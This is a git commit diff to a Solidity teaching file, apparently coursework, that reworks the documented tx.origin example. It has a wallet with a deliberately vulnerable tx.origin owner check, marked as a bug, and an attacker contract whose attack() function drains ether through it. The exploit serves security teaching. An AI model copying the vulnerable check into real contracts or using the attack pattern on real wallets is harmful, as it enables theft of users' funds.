bff2922d821e7d3ae30cf17079210704dd450d4e
Lee <jessy1092@gmail.com>
2022-09-10 21:39:42 +0800

    fix: Modify the tx.origin attack contract

--- packages/week5/contracts/TxOriginAttack.sol
+++ packages/week5/contracts/TxOriginAttack.sol
@@ -1,30 +1,40 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity >=0.7.0 <0.9.0;
 
-// From https://docs.soliditylang.org/en/latest/security-considerations.html?#tx-origin
+// Modify from https://docs.soliditylang.org/en/latest/security-considerations.html?#tx-origin
 // THIS CONTRACT CONTAINS A BUG - DO NOT USE
 contract TxUserWallet {
-	address owner;
+	address public owner;
 
-	constructor() {
+	constructor() payable {
 		owner = msg.sender;
 	}
 
+	receive() external payable {}
+
 	function transferTo(address payable dest, uint256 amount) public {
 		// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin
-		require(tx.origin == owner);
-		dest.transfer(amount);
+		require(tx.origin == owner, 'check failed');
+		(bool success, ) = dest.call{ value: amount }('');
+		require(success, 'call failed');
 	}
 }
 
 contract TxAttackWallet {
-	address payable owner;
+	address public owner;
+	address public attackContract;
 
-	constructor() {
-		owner = payable(msg.sender);
+	constructor(address _addr) {
+		owner = msg.sender;
+		attackContract = _addr;
 	}
 
-	receive() external payable {
-		TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
+	receive() external payable {}
+
+	function attack() external {
+		(bool success, ) = attackContract.call(
+			abi.encodeWithSignature('transferTo(address,uint256)', address(this), 0.01 ether)
+		);
+		require(success, 'failed');
 	}
 }
